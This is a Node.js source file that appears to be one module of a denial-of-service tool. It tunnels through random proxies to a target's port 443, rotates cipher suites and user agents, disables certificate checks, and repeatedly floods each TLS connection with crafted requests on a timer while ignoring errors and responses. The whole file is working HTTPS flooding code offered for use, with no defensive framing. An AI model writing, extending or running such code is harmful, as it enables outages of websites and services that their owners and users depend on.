const http = require('http')
const tls = require('tls')
const header = require('../header')
const proxy = require('../proxy')
const ua = require('../ua')


module.exports = {
    exec (config) {
        const cplist = [
            "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
            "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
            "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
        ]

        setInterval(() => {
            
            const proxyer = proxy.make()
            const data = header.make({
                url: config.url,
                host: config.urls.host,
                ua: ua.make(),
                post: config.post,
                post_length: config.post.length 
            })
            const cipper = cplist[Math.floor(Math.random() * cplist.length)];
            
            const request = http.request({
                host: proxyer[0],
                port: proxyer[1],
                ciphers: cipper,
                method: 'CONNECT',
                path: config.urls.host + ":443"
            }, (err) => {
                request.end()
            });

            request.on('connect', (res, socket, head) => {
                const tlsConnection = tls.connect({
                    host: config.urls.host,
                    ciphers: cipper,
                    secureProtocol: 'TLSv1_2_method',
                    servername: config.urls.host,
                    secure: true,
                    rejectUnauthorized: false,
                    socket
                }, () => {
                    for (let i = 0; i < config.rate; i++) {
                        tlsConnection.write(data)
                    }
                });

                tlsConnection.on('error', () => {
                    tlsConnection.end()
                    tlsConnection.destroy()
                })

                tlsConnection.on('data', (data) => {
                    //console.log(data)
                })
            })

            request.on('error', (err) => {
            })

            request.end()
        }, config.speed)
    }
}